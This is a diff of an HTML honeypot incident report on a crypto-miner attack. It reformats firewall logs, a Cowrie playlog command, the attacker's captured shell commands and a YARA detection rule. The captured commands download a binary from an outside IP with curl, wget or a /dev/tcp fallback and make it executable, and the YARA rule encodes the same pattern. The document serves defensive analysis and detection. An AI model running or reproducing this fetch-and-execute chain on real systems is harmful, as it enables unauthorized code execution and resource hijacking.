@@ -197,18 +197,59 @@ Shenzhen, China. This incident provided a valuable opportunity to
 analyze the attack vector, methodology, and potential mitigations.</p>
 <p><strong>Firewall Logs</strong></p>
 <p>The firewall recorded two connection attempts from the suspicious IP:</p>
-<hr>
-<p><strong>Date</strong>     <strong>Time</strong>   <strong>Source IP</strong>    <strong>Source   <strong>Target IP</strong>  <strong>Target   <strong>Protocol</strong>
-Port</strong>                    Port</strong></p>
-<hr>
-<p>2024-05-06   02:54:17   39.108.186.231   16525      172.31.19.98   2222       TCP</p>
-<h2 id="2024-05-06---025428---39108186231---37700------172311998---2222-------tcp">
-  2024-05-06   02:54:28   39.108.186.231   37700      172.31.19.98   2222       TCP
-  <a class="heading-link" href="#2024-05-06---025428---39108186231---37700------172311998---2222-------tcp">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
+<p>|&mdash;&mdash;&mdash;&mdash;|&mdash;&mdash;&mdash;&ndash;|&mdash;&mdash;&mdash;&mdash;&mdash;-|&mdash;&mdash;&mdash;&mdash;|&mdash;&mdash;&mdash;&mdash;&mdash;|&mdash;&mdash;&mdash;-|&mdash;&mdash;&mdash;&mdash;&ndash;|
+|<strong>Date</strong>    | <strong>Time</strong>  | <strong>Source IP</strong>  |  **Source  | <strong>Target IP</strong> | **Target |  <strong>Protocol</strong>|</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+<th>Port**</th>
+<th></th>
+<th>Port**</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2024-05-06</td>
+<td>02:54:17</td>
+<td>39.108.186.231</td>
+<td>16525</td>
+<td>172.31.19.98</td>
+<td>2222</td>
+<td>TCP</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>2024-05-06</td>
+<td>02:54:28</td>
+<td>39.108.186.231</td>
+<td>37700</td>
+<td>172.31.19.98</td>
+<td>2222</td>
+<td>TCP</td>
+</tr>
+<tr>
+<td>&mdash;&mdash;&mdash;&mdash;</td>
+<td>&mdash;&mdash;&mdash;&ndash;</td>
+<td>&mdash;&mdash;&mdash;&mdash;&mdash;-</td>
+<td>&mdash;&mdash;&mdash;&mdash;</td>
+<td>&mdash;&mdash;&mdash;&mdash;&mdash;</td>
+<td>&mdash;&mdash;&mdash;-</td>
+<td>&mdash;&mdash;&mdash;&mdash;&ndash;</td>
+</tr>
+</tbody>
+</table>
 <p>https[://]isc.sans.edu/data/</p>
 <p><strong>Subject Description</strong></p>
 <p>The attack involved an attempt to download and execute a malicious file.
@@ -219,21 +260,26 @@ financial gain at the expense of the compromised system.</p>
 <p><strong>Analysis of the Activity</strong></p>
 <p><strong>Log Analysis</strong></p>
 <p>The playlog feature was used to analyze the attack:</p>
-<p>python3 /srv/cowrie/bin/playlog
-./b65fea451d07c3d5ff37c4b21496aa075078051a2c3145690babfa5956500ebf</p>
+<p><code>python3 /srv/cowrie/bin/playlog ./b65fea451d07c3d5ff37c4b21496aa075078051a2c3145690babfa5956500ebf</code></p>
 <p>By filtering the cowrie.json logs for the relevant timestamp &quot;02:54&quot;
 and session ID a79d01830e6d, multiple entries were found revealing the
 attacker's commands.</p>
 <p>Sample of the logs found using grep to filter by session ID below:</p>
-<p>nohup $SHELL -c \&quot;curl http://125.124.222.170:60111/linux -o
-/tmp/cETqZjW89H;</p>
-<p>if [ ! -f /tmp/cETqZjW89H ];</p>
-<p>then wget http://125.124.222.170:60111/linux -O /tmp/cETqZjW89H;</p>
-<p>fi;</p>
-<p>if [ ! -f /tmp/cETqZjW89H ];</p>
-<p>then exec 6&lt;&gt;/dev/tcp/125.124.222.170/60111 &amp;&amp; echo -n 'GET /linux'
-&gt;&amp;6 &amp;&amp; cat 0&lt;&amp;6 &gt; /tmp/cETqZjW89H &amp;&amp; chmod +x /tmp/cETqZjW89H
-...\&quot;</p>
+<pre><code>```nohup \$SHELL -c \\\&quot;curl http://125.124.222.170:60111/linux -o
+/tmp/cETqZjW89H;
+
+if \[ ! -f /tmp/cETqZjW89H \];
+
+then wget http://125.124.222.170:60111/linux -O /tmp/cETqZjW89H;
+
+fi;
+
+if \[ ! -f /tmp/cETqZjW89H \];
+
+then exec 6\&lt;\&gt;/dev/tcp/125.124.222.170/60111 &amp;&amp; echo -n \'GET /linux\'
+\&gt;&amp;6 &amp;&amp; cat 0\&lt;&amp;6 \&gt; /tmp/cETqZjW89H &amp;&amp; chmod +x /tmp/cETqZjW89H
+\...\\\&quot;```
+</code></pre>
 <p><img src="/Miner_post_figure1.png" alt="Figure 1"></p>
 <p>Figure 1: Similar attacks by IP address.</p>
 <p><strong>Malware Analysis</strong></p>
@@ -250,28 +296,43 @@ their networks?</strong></p>
 222 instances of similar attacks, primarily from IP addresses located in
 China. For more information on how to use YARA please reference YARA&rsquo;s
 documentation [1]. The rule &ldquo;Miner&rdquo; is below:</p>
-<p>rule Miner</p>
-<p>{</p>
-<p>meta:</p>
-<p>description = &quot;Detects potential miner attack&quot;</p>
-<p>author = &quot;Gabriel Mora&quot;</p>
-<p>date = &quot;2024-05-23&quot;</p>
-<p>version = &quot;1.0&quot;</p>
-<p>strings:</p>
-<p>$min_curl = /curl
-http:\/\/[0-9]{1,3}(\.[0-9]{1,3}){3}:[0-9]+\/linux -o
-\/tmp\/[a-zA-Z0-9]+/</p>
-<p>$min_wget = /wget
-http:\/\/[0-9]{1,3}(\.[0-9]{1,3}){3}:[0-9]+\/linux -O
-\/tmp\/[a-zA-Z0-9]+/</p>
-<p>$min_tcp = /exec
-6&lt;&gt;\/dev\/tcp\/[0-9]{1,3}(\.[0-9]{1,3}){3}\/[0-9]+ &amp;&amp; echo
--n 'GET \/linux' &gt;&amp;6 &amp;&amp; cat 0&lt;&amp;6 &gt; \/tmp\/[a-zA-Z0-9]+/</p>
-<p>$min_chmod = /chmod \+x \/tmp\/[a-zA-Z0-9]+ &amp;&amp;
-\/tmp\/[a-zA-Z0-9]+ [a-zA-Z0-9+\/]+/</p>
-<p>condition:</p>
-<p>all of ($min*)</p>
-<p>}</p>
+<pre><code>```rule Miner
+
+{
+
+meta:
+
+description = \&quot;Detects potential miner attack\&quot;
+
+author = \&quot;Gabriel Mora\&quot;
+
+date = \&quot;2024-05-23\&quot;
+
+version = \&quot;1.0\&quot;
+
+strings:
+
+\$min_curl = /curl
+http:\\/\\/\[0-9\]{1,3}(\\.\[0-9\]{1,3}){3}:\[0-9\]+\\/linux -o
+\\/tmp\\/\[a-zA-Z0-9\]+/
+
+\$min_wget = /wget
+http:\\/\\/\[0-9\]{1,3}(\\.\[0-9\]{1,3}){3}:\[0-9\]+\\/linux -O
+\\/tmp\\/\[a-zA-Z0-9\]+/
+
+\$min_tcp = /exec
+6\&lt;\&gt;\\/dev\\/tcp\\/\[0-9\]{1,3}(\\.\[0-9\]{1,3}){3}\\/\[0-9\]+ &amp;&amp; echo
+-n \'GET \\/linux\' \&gt;&amp;6 &amp;&amp; cat 0\&lt;&amp;6 \&gt; \\/tmp\\/\[a-zA-Z0-9\]+/
+
+\$min_chmod = /chmod \\+x \\/tmp\\/\[a-zA-Z0-9\]+ &amp;&amp;
+\\/tmp\\/\[a-zA-Z0-9\]+ \[a-zA-Z0-9+\\/\]+/
+
+condition:
+
+all of (\$min\*)
+
+}```
+</code></pre>
 <p><strong>Attack Goals and MITRE ATT&amp;CK Framework</strong></p>
 <p>The primary goal of the attack is to install a crypto miner, hijacking
 system resources for mining cryptocurrencies. This technique falls under
